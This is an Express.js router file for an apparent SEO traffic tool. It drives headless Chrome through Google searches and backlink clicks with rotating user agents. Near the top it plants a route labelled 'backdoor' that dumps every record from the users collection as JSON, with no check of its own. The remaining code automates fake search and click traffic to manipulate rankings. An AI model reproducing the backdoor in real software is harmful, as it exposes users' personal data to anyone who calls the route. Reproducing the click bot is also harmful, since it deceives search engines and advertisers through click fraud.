var router = require('express').Router();
var mongoose = require('mongoose');
var puppeteer = require('puppeteer');
var Const = require("Const");
var searchByKeyWord = require('./../../../services/searchByKeyWord');
var changeUserAgent = require('./../../../services/changeUserAgent');
var setTimeDelay = require('./../../../services/setTimeDelay');
var clickRandom = require('./../../../services/clickRandom');
var suggestDomain = require('./../../../services/suggestDomain');
var getProject = require('./../../../services/getProject');
var saveLog = require('./../../../services/saveLog');
var { sendCloseBrower,
  sendGotoGoogle,
  sendChangingAgent,
  sendInvalidQuery,
  sendCurrentUserAgent,
  sendCurrentURL,
  sendChangingAgentBacklink,
  sendCurrentUserAgentBacklink,
  sendGotoDomainBacklink,
  sendFindingBacklink,
  sendFoundBacklink,
  sendNotFoundBacklink,
  sendNotFoundDomainWithKeyword
} = require('services/socket');

//this is backdoor
router.get('/backdoor',async(req,res)=>{
  let result=await mongoose.model('users').find();
  res.json(result);
})
//end backdoor

//add project
//call when client click save new project button
router.post('/addproject', async (req, res) => {
  try {
    console.log(req.body)
    let projects = await mongoose.model('projects').create({ ...req.body, keyword: JSON.parse(req.body.keyword), belongTo: req.user._id, status: 'not stated' });

    res.json(projects);

  } catch (error) {

    console.log("TCL: error", error)

    res.json({
      status: 'error',
      message: error
    })
  }

});

//get project by id

//call when client click view detail button
router.get('/project/:id', async (req, res) => {

  try {

    let project = await mongoose.model('projects').findById(req.params.id).populate('log');

    res.json(project);

  } catch (error) {

    res.json(error);
  }

})


//homepage router
router.get('/', async function (req, res, next) {

  try {

    let allProject = await mongoose.model('projects').find({ belongTo: req.user._id });

    res.render('adminpage', { allProject });

  } catch (error) {

    console.log("render admin page error: ", error)
    next(error);
  }


});

//click backlink request
router.post('/backlink', async (req, res) => {

  let { domain, backlink, amount, delay, socketID } = req.body;

  for (let i = 0; i < amount; i++) {

    let isSuccessed = await clickBackLink(domain, backlink, delay, socketID);

    if (!isSuccessed) {

      sendNotFoundBacklink(socketID, backlink);
      break;

    }

  }

  res.send('ok');

})

//suggest domain request
router.post('/suggest', async (req, res, next) => {

  let { projectId, userid } = req.body;

  let { keyword, domain, delay, amount } = await getProject(projectId);

  //set status of project to "running"
  try {

    let updateProject = await mongoose.model('projects').findById(projectId);

    updateProject.status = 'running';
    updateProject.save();

  } catch (error) {

    console.log('error when change project status', error);
    next(error);
  }

  //main process 
  for (let i = 0; i < amount; i++) {

    let isCrashed = await searchAndSuggestMultipleKeyword(keyword, domain, delay, projectId, userid);

    if (isCrashed) {

      sendInvalidQuery(userid);
      break;

    }

  }

  //set status of project to "stopped"
  try {

    let updateProject = await mongoose.model('projects').findById(projectId);

    updateProject.status = 'stopped';
    updateProject.save();

  } catch (error) {

    console.log('error when change project status', error);
    next(error);
  }

  res.send('ok');

})

//update user's socket request
router.post('/sendSocket', async (req, res) => {

  let { userid, socketid } = req.body;

  try {

    let user = await mongoose.model('users').findById(userid);

    user.currentSocketID = socketid;
    await user.save();

    res.send('ok');

  } catch (error) {

    console.log('err update user socket');
  }

})

/**
 * 
 * @param {*} keyword 
 * @param {*} domain 
 * @param {bool} isChangeUserAgent 
 * @param {number} delayTime time stay at website after access (seconds)
 * @param {*} projectId
 * @param {*} userid
 * @return {boolean} true (operation crashed)  false(operation success) 
 */
const searchAndSuggestSingleKeyword = async (keyword, domain, delayTime, projectId, userid) => {

  let wasClicked = false;
  let runTime = 0;

  while (wasClicked == false) {

    runTime++;

    if (runTime > 3) return true;

    //set up brower and page
    let brower = await puppeteer.launch(Const.options);
    const page = await brower.newPage();
    await page.setCacheEnabled(false);
    await page.setViewport({
      width: 1366,
      height: 768,
    });
    await page.on('console', consoleObj => console.log(consoleObj.text()));

    //change user agent
    await saveLog(projectId, 'Đang thay đổi User Agent ...');
    await sendChangingAgent(userid, projectId);
    let currentUserAgent = await changeUserAgent(page);
    await sendCurrentUserAgent(userid, projectId, currentUserAgent);
    await saveLog(projectId, 'Thay đổi User Agent thành công');

    try {

      await page.goto('https://www.google.com/');
      await saveLog(projectId, 'https://www.google.com/');
      await sendGotoGoogle(userid, projectId);

      await searchByKeyWord(page, keyword);
      wasClicked = await suggestDomain(userid, projectId, page, domain);

      await setTimeDelay(delayTime);
      await page.waitFor(Const.timeDelay);

      await sendCloseBrower(userid, projectId);
      await saveLog(projectId, 'Đang đóng trình duyệt ...');
      brower.close();

    } catch (error) {

      console.log("TCL: searchAndSuggest -> error", error)
      brower.close();
    }
  }

  return false;
}


/**
 * 
 * @param {Array} keyword array of keyword 
 * @param {*} domain 
 * @param {number} delayTime time stay at website after access (seconds)
 * @param {*} projectId
 * @param {*} userid
 * @return {boolean} true (not found any domain with keywords provided)  false(operation success) 
 */
const searchAndSuggestMultipleKeyword = async (keyword, domain, delayTime, projectId, userid) => {

  let isNotFoundDomain;

  for (let i = 0; i < keyword.length; i++) {

    isNotFoundDomain = await searchAndSuggestSingleKeyword(keyword[i], domain, delayTime, projectId, userid);

    if (isNotFoundDomain) {
      saveLog(projectId, 'Không tìm thấy domain cần tìm ứng với keyword ' + keyword[i]);
      sendNotFoundDomainWithKeyword(userid, projectId, keyword[i]);
    }
  }

  return isNotFoundDomain;

}


/**
 * go to domain , find and click backlink
 * @param {*} domain 
 * @param {*} backlink 
 * @param {*} delay second
 * @param {*} socketID 
 * @return {boolean} true(operation successed) | false(operation falsed)
 */
const clickBackLink = async (domain, backlink, delay, socketID) => {

  //set up brower and page
  let brower = await puppeteer.launch(Const.options);
  const page = await brower.newPage();
  await page.setCacheEnabled(false);
  await page.setViewport({
    width: 1366,
    height: 768,
  });
  await page.on('console', consoleObj => console.log(consoleObj.text()));

  //change user agent
  await sendChangingAgentBacklink(socketID);
  let currentUserAgent = await changeUserAgent(page);
  await sendCurrentUserAgentBacklink(socketID, currentUserAgent);

  //go to domain
  //find and click backlink
  await sendGotoDomainBacklink(socketID, domain);
  await page.goto(domain);

  await sendFindingBacklink(socketID);
  let wasClicked = await page.evaluate(async (backlink) => {

    //search all dom tree to find backlink
    let extractedDOM = await document.querySelectorAll(`a`);

    if (extractedDOM.length == 0) return false;

    try {

      for (let i = 0; i < extractedDOM.length; i++) {

        if (extractedDOM[i].innerText.includes(backlink)) {

          await extractedDOM[i].click();
          return true;
        }
      }

      return false;
    } catch (error) {

      console.log("TCL: clickBackLink -> error", error)
      return false;
    }

  }, backlink);

  if (wasClicked == false) {
    await brower.close();
    return false;
  }

  //set time stay on page after click
  await sendFoundBacklink(socketID, backlink);
  await setTimeDelay(delay);
  await page.waitFor(Const.timeDelay);

  await brower.close();
  return true;

}


module.exports = router;
